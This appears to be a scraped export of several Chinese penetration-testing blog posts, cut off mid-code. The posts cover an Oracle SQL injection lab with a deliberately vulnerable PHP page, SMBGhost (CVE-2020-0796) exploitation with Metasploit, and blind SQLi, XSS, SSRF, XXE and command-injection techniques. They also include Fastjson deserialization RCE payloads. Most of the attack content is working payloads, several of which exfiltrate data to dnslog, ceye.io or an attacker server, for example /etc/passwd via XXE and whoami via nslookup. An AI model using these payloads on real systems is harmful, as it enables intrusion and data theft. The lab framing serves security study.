安装phpstudy1、phpstudy下载地址如下：http://public.xp.cn/upgrades/phpStudy20161103.zip这里推荐使用2016版本，因为我使用2018死活搭不成功安装过程很简单，设置安装路径，下一步下一步即可。2、切换版本为5.5.38，这里推荐这个因为我就是这个搭成功的。（如果显示需要安装VC扩展库的话，按照教程安装即可，我这里安装的是VC11的，链接放这了：https://www.php.cn/xiazai/download/1481）3、安装完之后，打开phpinfo也可以像我这样在C:\\phpStudy\\WWW目录下新建phpinfo.php文件，内容为： 1&lt;?php phpinfo();?&gt; 这里看到是32位的。 0x03 设置oci8扩展（这里我是死活不成功，弄了半天）1、首先在C:\\phpStudy\\php\\php-5.5.38目录下，修改php.ini的内容（搜索oci8，找到对应的扩展处，将前面的;删除即可。）2、之后就开始苦逼地调试环境了，最终弄好是根据这篇文章弄好的，链接如下：https://www.it1352.com/1713162.html在php路径下，打开cmd，输入如下命令： 12345678910111213141516C:\\phpStudy\\php\\php-5.5.38&gt;php.exe -mPHP Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll&#x27; - %1 不是有效的 Win32 应用程序。 in Unknown on line 0Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll&#x27; - %1 不是有效的 Win32 应用程序。 in Unknown on line 0PHP Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll&#x27; - %1 不是有 效的 Win32 应用程序。 in Unknown on line 0Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll&#x27; - %1 不是有效的 Win32 应用程序。 in Unknown on line 0PHP Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll&#x27; - %1 不是有效的 Win32 应用程序。 in Unknown on line 0Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll&#x27; - %1 不是有效的 Win32 应用程序。 in Unknown on line 0 3、根据文章中所说，安装oracle instantclient，链接如下：https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html因为数据库是11g的，所以安装11.1.x版本4、下载好之后解压，放入C:\\instantclient_11_15、设置环境变量，这一步很重要在此电脑右键属性 - 高级系统设置 - 环境变量 - 系统变量（Path） - 编辑增加这三个路径，注意顺序不要变，instantclient必须放在php的上面。6、验证，在cmd命令提示符中输入 1where oci* 出现instantclient的路径即可。7、重启计算机8、在php路径下，打开cmd，输入如下命令并查看结果（没有出现“不是有效的 Win32 应用程序”即可） 1php.exe --ri oci8 9、在phpinfo中搜索oci8，有如下界面表示扩展已经开启成功。（没有就重启phpstudy）当出现如下界面，环境就已经基本搭建好了。 0x04 创建漏洞测试环境1、 建立存在漏洞数据1、首先使用navicat连接数据库（这里有一个坑，连接时可能会出现oracle library is not loaded）在工具 - 选项处修改oci环境，选择之前数据库安装的路径，修改完后记得重启2、连接数据库之后，选择相应的用户，我这里是SYSTEM3、新建表TEST，设置如下字段4、添加如下数据（数据其实是任意的，随意添加即可）5、新建查询进行验证以上漏洞数据就简单搭建成功了。 2、搭建PHP站点1、将源码保存为oracle.php文件，放到C:\\phpStudy\\WWW目录下源码如下： 12345678910111213141516171819202122232425262728&lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); $id = @$_GET[&#x27;id&#x27;]; $dbstr =&quot;(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =127.0.0.1)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = orcl) (INSTANCE_NAME = orcl)))&quot;; //连接数据库的参数配置 $conn = oci_connect(&#x27;system&#x27;,&#x27;root&#x27;,$dbstr);//连接数据库，前两个参数分别是账号和密码 if (!$conn) &#123; $Error = oci_error();//错误信息 print htmlentities($Error[&#x27;message&#x27;]); exit; &#125; else &#123; echo &quot;&lt;h3&gt;Oracle 注入测试靶场&lt;/h3&gt;&quot;.&quot;&lt;br&gt;&quot;; $sql = &quot;select * from TEST where id=&quot;.$id;//sql查询语句 echo &quot;当前sql语句为：&quot;.$sql.&quot;&lt;br&gt;&quot;.&quot;&lt;br&gt;&quot;;//输出sql查询语句 $ora_b = oci_parse($conn,$sql); //编译sql语句 oci_execute($ora_b,OCI_DEFAULT); //执行 while($r=oci_fetch_row($ora_b)) //取回结果 &#123; $i=0; echo &quot;Id:&quot;.$r[$i++].&quot; &lt;/t&gt; &lt;br&gt;&quot;; echo &quot;Name:&quot;.$r[$i++].&quot; &lt;/t&gt;&lt;br&gt; &quot;; echo &quot;Age:&quot;.$r[$i++].&quot; &lt;/t&gt;&lt;br&gt; &quot;; &#125; &#125; oci_close($conn);//关闭连接?&gt; 2、访问http://localhost/oracle.php?id=1，返回如下界面表示搭建成功，数据库也成功连接了。 0x05 Oracle注入测试1、检测漏洞点1http://localhost/oracle.php?id=1 and 1=1 1http://localhost/oracle.php?id=1 and 1=2 2、显错注入1http://localhost/oracle.php?id=-1 union all select 1,(select user from dual),3,&#x27;4&#x27; from dual -- 3、报错注入1http://localhost/oracle.php?id=-1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) -- 4、布尔盲注1http://localhost/oracle.php?id=1 and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0) from dual) -- 1http://localhost/oracle.php?id=1 and 1=(select decode(user,&#x27;SSSSS&#x27;,1,0) from dual) -- 5、延时盲注1http://localhost/oracle.php?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) -- 6、外带数据1http://localhost/oracle.php?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.pgx519.dnslog.cn&#x27;) from dual)is not null -- 0x06 总结Oracle数据库注入测试只是简单测试了各种注入到效果，具体测试详情可以看我之前写的文章《Oracle数据库注入总结》。之前因为测试漏洞的时候没有找到很好的在线测试平台，并且自己搭建的时候遇到了各种各样的问题，这里解决问题后写成文章，希望对于想自己搭建注入靶场的安全从业人员有所帮助～","path":"2021/08/01/Oracle数据库注入环境搭建/"},{"title":"漏洞复现-SMB远程代码执行漏洞（CVE-2020-0796）","text":"环境搭建虚拟机wmwareWindows10下载地址：迅雷下载 ：ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D| 漏洞概述SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。该漏洞的后果十分接近永恒之蓝系列，都利用Windows SMB漏洞远程攻击获取系统最高权限，WannaCry勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。除了直接攻击SMB服务端造成RCE外，该漏洞得亮点在于对SMB客户端的攻击，攻击者可以构造特定的网页，压缩包，共享目录，OFFICE文档等多种方式触发漏洞进行攻击。 漏洞影响漏洞不影响win7，漏洞影响Windows 10 1903之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 1903 for x64-based SystemsWindows 10 Version 1903 for ARM64-based SystemsWindows Server, Version 1903 (Server Core installation)Windows 10 Version 1909 for 32-bit SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server, Version 1909 (Server Core installation) 漏洞检测测试是否能ping通靶机如果ping不通，可能情况是靶机开启了防护墙Windows defender，可以手动进行关闭 检测漏洞存在使用exp检测漏洞存在下载地址：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip使用方法：下载后使用CVE-2020-0796-Scanner.exe，输入ip地址即可 漏洞利用1、通过 MSF 生成 shellcode：msfvenom -p windows/x64/meterpreter/bind_tcp lport=9999 -f py -o shellcode.txt2、通过exp利用脚本利用shellcode下载地址：https://github.com/chompie1337/SMBGhost_RCE_PoC.git3、将生成的shellcode的内容中的buf替换成USER_PAYLOAD 4、替换exploit.py中的USER_PAYLOAD的内容5、msf开启监听msfconsoleuse exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset lport 9999set rhost 192.168.229.166exploit6、在靶机执行exploit.py脚本python3 exploit.py -ip 192.168.229.166然后，成功蓝屏。。。","path":"2021/07/02/漏洞复现-SMB远程代码执行漏洞（CVE-2020-0796）/"},{"title":"PHP无回显渗透测试总结","text":"本文已发布到先知社区：https://xz.aliyun.com/t/9916 作者：ajie 0x01前言在渗透测试过程中，开发不可能每一次都将结果输出到页面上，也就是漏洞无回显的情况，那么在这种情况下，我们可以通过dnslog判断漏洞存在，或者通过起一个python的http服务来判断，方法很多，下面主要进行一些情况的分析。 0x02无回显概念无回显，即执行的payload在站点没有输出，无法进行进一步操作。在渗透测试过程中，漏洞点不可能总是能够在返回页面进行输出，那么这时候就需要进行一些无回显利用了。 0x03不同漏洞的无回显1、SQL注入无回显SQL注入，作为OWASP常年占据榜首位置的漏洞，在无回显中也是常见的。当然SQL注入在无回显上已经具有了一定的解决措施。无回显我将其定义为页面没有输出我们想要得到的内容，下面以sqli-labs为例进行讲解。 1.1 布尔盲注 布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。 4、通过length()函数判断数据库库名的长度大于1。?id=1’ and length(database())&gt;1 %235、在大于8的时候页面返回空，所以数据库库名长度等于8。6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码?id=1’ and ascii(substr((select database()),1,1))&gt;97 %23?id=1’ and ascii(substr((select database()),1,1))=101 %23首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。7、更改截取的位置，判断后面的字符对应的ascii码值。?id=1’ and ascii(substr((select database()),2,1))=101 %23 1.2 延时盲注 延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4.*秒；使用sleep(5)延时5秒之后，页面响应时间为9.*秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。?id=2’ and if((length(database())=8),sleep(5),1) %234、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。?id=2’ and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %235、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。 巧用dnslog进行SQL注入 前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。 Dnslog dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。 Load_file()函数 数据库中的load_file()函数，可以加载服务器中的内容。load_file(‘c:/1.txt’)，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件： 1.文件在服务器上 2.指定完整路径的文件 3.必须有FILE权限 UNC路径 UNC路径就是类似\\softer这样的形式的网络路径。它符合 \\服务器名\\服务器资源的格式。在Windows系统中常用于共享文件。如\\192.168.1.1\\共享文件夹名。 Dnslog注入实例演示1、打开实例站点，很明显这里是只能使用盲注的站点。2、通过order by判断出字段数为3。3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下： 12?id=1 &#x27; union select 1,2,load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.pcijrt.dnslog.cn/abc&#x27;)) %23 5、执行语句之后在dnslog日志中获取到数据库库名为security。6、修改子查询里的内容，获取其他数据。 2、XSS无回显XSS无回显比较特殊，一般XSS漏洞的判断标准为弹框，但是有这样一种情况，在一个表单提交处，内容提交之后只会在页面显示提交成功与否，不会输出提交的内容，那么我们也就无法通过弹框来判断XSS漏洞存在与否。这时候就需要通过XSS盲打来进行攻击。下面通过Pikachu漏洞练习平台来进行实例讲解： 2.1 XSS盲打1、如图这里是一个提交看法的功能2、随便输入内容提交，告诉我们提交成功，没有将我输入的内容返回到页面中3、登录后台可以看到确实有数据回显4、输入弹框语句会在后台成功执行5、在渗透测试过程中我们无法登录后台进行查看，那么就需要盲打XSS，输入XSS平台的payload，坐等管理员查看内容后上钩。 2.2 通过dnslog判断漏洞存在12payload:&lt;img src=http://xss.t7y3wc.dnslog.cn&gt; 3、SSRF无回显SSRF即服务端请求伪造，一种由攻击者构造的通过服务器发起请求的攻击。测试代码如下： 123&lt;?php echo file_get_contents($_GET[&#x27;url&#x27;]);?&gt; 首先通过访问百度可以验证漏洞存在无回显情况即不进行输出，页面返回空这种情况可以通过dnslog或者python搭建http服务验证1、DNSLOGhttp://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn2、python起的http服务 1python3 -m http.server 4545 http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545 4、XXE无回显因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到。XXE无回显问题当然也是可以通过在域名前面放入查询出的内容，将数据通过dns日志记录下来。XXE虽然不是通过DNSlog，但是也同样是外带数据。流程如下：在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上。1.xml 1&lt;!ENTITY% all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://攻击者的IP地址/2.php?id=%file;&#x27;&gt;&quot;&gt;%all; 2.php 1&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&quot;id&quot;],FILE_APPEND);?&gt; 3.txt 1内容空 payload： 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % remote SYSTEM&quot;http://服务器IP地址/xxe/1.xml&quot;&gt;%remote;%send;]&gt; 5、命令执行无回显简单的命令执行站点输入任何命令都无回显 5.1 Dnslog判断漏洞存在http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn 5.2Dnslog外带数据5.2.1 获取windows用户名1http://127.0.0.1/test_blind/exec.php?cmd=ping+%USERNAME%.io5a5i.dnslog.cn windows常用变量： 1234567891011121314151617181920212223242526272829303132//变量 类型 描述//%ALLUSERSPROFILE% 本地 返回“所有用户”配置文件的位置。//%APPDATA% 本地 返回默认情况下应用程序存储数据的位置。//%CD% 本地 返回当前目录字符串。//%CMDCMDLINE% 本地 返回用来启动当前的 Cmd.exe 的准确命令行。//%CMDEXTVERSION% 系统 返回当前的“命令处理程序扩展”的版本号。//%COMPUTERNAME% 系统 返回计算机的名称。//%COMSPEC% 系统 返回命令行解释器可执行程序的准确路径。//%DATE% 系统 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。//%ERRORLEVEL% 系统 返回上一条命令的错误代码。通常用非零值表示错误。//%HOMEDRIVE% 系统 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。//%HOMEPATH% 系统 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。//%HOMESHARE% 系统 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。//%LOGONSERVER% 本地 返回验证当前登录会话的域控制器的名称。//%NUMBER_OF_PROCESSORS% 系统 指定安装在计算机上的处理器的数目。//%OS% 系统 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。//%PATH% 系统 指定可执行文件的搜索路径。//%PATHEXT% 系统 返回操作系统认为可执行的文件扩展名的列表。//%PROCESSOR_ARCHITECTURE% 系统 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。//%PROCESSOR_IDENTFIER% 系统 返回处理器说明。//%PROCESSOR_LEVEL% 系统 返回计算机上安装的处理器的型号。//%PROCESSOR_REVISION% 系统 返回处理器的版本号。//%PROMPT% 本地 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。//%RANDOM% 系统 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。//%SYSTEMDRIVE% 系统 返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。//%SYSTEMROOT% 系统 返回 Windows server operating system 根目录的位置。//%TEMP%和%TMP% 系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。//%TIME% 系统 返回当前时间。使用与 time /t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。//%USERDOMAIN% 本地 返回包含用户帐户的域的名称。//%USERNAME% 本地 返回当前登录的用户的名称。//%USERPROFILE% 本地 返回当前用户的配置文件的位置。//%WINDIR% 系统 返回操作系统目录的位置。 5.2.2 其他命令执行1cmd /c whoami &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;FOR /F &quot;eol=- delims=&quot; %i IN (temp) DO (set _=%i &amp; cmd /c nslookup %_:~0,-1%.xxxx.ceye.io)&amp;del temp 1cmd /c ipconfig &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;FOR /F &quot;eol=- delims=&quot; %i IN (temp) DO (set _=%i &amp; cmd /c nslookup %_:~0,40%.xxxx.ceye.io &amp; cmd /c nslookup %_:~40,-1%.xxxx.ceye.io)&amp;del temp 通过POST传参测试传参的内容需要进行url编码Post传参Dnslog获取结果Base64解码获取内容 总结 在渗透测试过程中，无回显是很常见的，程序不可能将一些操作都回显到页面中，那么这种时候我们就需要外带数据来获取想要的内容。当然最好就是能够反弹shell，通过获取shell来执行命令，这样会舒服很多。 无回显的情况还有很多很多，这里简单介绍了几种，希望读者朋友们能够从中学到对于无回显的情况下如何进行渗透测试，方法很多，不固定，学习思路即可。","path":"2021/07/02/PHP无回显渗透测试总结/"},{"title":"漏洞复现-Fastjson全方位利用","text":"FastJson为什么经常爆出安全漏洞？罪魁祸首就是autoType特性, 这就是潘多拉魔盒, 永远都会存在未知安全漏洞。如果说要选择一个具有代表特征的JAVA漏洞，那么我觉得是fastjson，下面介绍fastjson的两个经典漏洞复现，希望让大家对于fastjson的漏洞利用有所了解。 概念fastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。FastJson特点如下： （1）能够支持将java bean序列化成JSON字符串，也能够将JSON字符串反序列化成Java bean。（2）顾名思义，FastJson操作JSON的速度是非常快的。（3）无其他包的依赖。（4）使用比较方便。 Fastjson指纹特征及判别方法根据返回包判断任意抓个包，提交方式改为POST，花括号不闭合。返回包在会出现fastjson字样。 Dnslog盲打12345&#123;&quot;rand1&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;&#123;&quot;rand2&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;&#123;&quot;rand3&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;&#123;&quot;rand4&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;&#125;&#123;&quot;rand5&quot;:&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125; 12345一些畸形payload，不过依然可以触发dnslog：&#123;&quot;rand6&quot;:&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog网址&quot;&#125;&#125;&quot;&quot;&#125;&#125;&#123;&quot;rand7&quot;:Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;]&#125;&#123;&quot;rand8&quot;:Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;&#123;&quot;rand9&quot;:&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog网址&quot;&#125;:0 Fastjson历史漏洞ver&lt;=1.2.241.2.24及之前没有任何防御，并且autotype默认开启。 ver&gt;=1.2.25&amp;ver&lt;=1.2.41从1.2.25开始默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。在1.2.25到1.2.41之间，发生了一次checkAutotype的绕过。 ver=1.2.42在1.2.42对1.2.25~1.2.41的checkAutotype绕过进行了修复，将黑名单改成了十进制，对checkAutotype检测也做了相应变化。黑名单改成了十进制，检测也进行了相应hash运算。 ver=1.2.43在第一个if条件之下（L开头，;结尾），又加了一个以LL开头的条件，如果第一个条件满足并且以LL开头，直接抛异常。所以这种修复方式没法在绕过了。但是上面的loadclass除了L和;做了特殊处理外，[也被特殊处理了，又再次绕过了checkAutoType。 ver=1.2.44修复了1.2.43的绕过，处理了[。删除了之前的L开头、;结尾、LL开头的判断，改成了[开头就抛异常，;结尾也抛异常，所以这样写之前的几次绕过都修复了。 ver&gt;=1.2.45&amp;ver&lt;1.2.46这两个版本期间就是增加黑名单，没有发生checkAutotype绕过。 ver=1.2.47这个版本发生了不开启autotype情况下能利用成功的绕过。解析一下这次的绕过： 利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回 ver&gt;=1.2.48&amp;ver&lt;=1.2.68在1.2.48修复了1.2.47的绕过，在MiscCodec，处理Class类的地方，设置了cache为false。在1.2.48到最新版本1.2.68之间，都是增加黑名单类 ver=1.2.681.2.68是目前最新版，在1.2.68引入了safemode，打开safemode时，@type这个specialkey完全无用，无论白名单和黑名单，都不支持autoType了。 一些RCE Payload12345678payload1:&#123; &quot;rand1&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;autoCommit&quot;: true &#125;&#125; 123456789101112payload2:&#123; &quot;rand1&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [ &quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&quot; ], &quot;_name&quot;: &quot;aaa&quot;, &quot;_tfactory&quot;: &#123;&#125;, &quot;_outputProperties&quot;: &#123;&#125; &#125;&#125; 123456789payload3:&#123; &quot;rand1&quot;: &#123; &quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;, &quot;properties&quot;: &#123; &quot;data_source&quot;: &quot;ldap://localhost:1389/Object&quot; &#125; &#125;&#125; 1234567891011121314payload4:&#123; &quot;rand1&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;, &quot;targetBeanName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;propertyPath&quot;: &quot;foo&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://localhost:1389/Object&quot; ] &#125; &#125;&#125; 1234567891011121314151617payload5:&#123; &quot;rand1&quot;: Set[ &#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;, &quot;beanFactory&quot;: &#123; &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;, &quot;shareableResources&quot;: [ &quot;ldap://localhost:1389/obj&quot; ] &#125;, &quot;adviceBeanName&quot;: &quot;ldap://localhost:1389/obj&quot; &#125;, &#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot; &#125;]&#125; 1234567payload6:&#123; &quot;rand1&quot;: &#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;, &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&quot; &#125;&#125; 12345678payload7:&#123; &quot;rand1&quot;: &#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;, &quot;jndiName&quot;: &quot;ldap://localhost:1389/Object&quot;, &quot;loginTimeout&quot;: 0 &#125;&#125; 实战渗透测试Fastjson&lt;1.2.24远程代码执行1、使用docker搭建环境 2、访问IP:8090显示此页面表示搭建成功 3、攻击机中dnslog.java文件，内容如下： 123456789101112131415161718192021222324252627import java.lang.Runtime;import java.lang.Process;public class dnslog&#123; static &#123; try &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123; &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ping user.`whoami`.dnslog地址&quot;&#125;; Process pc = rt.exec(commands); pc.waitFor(); &#125; catch (Exception e) 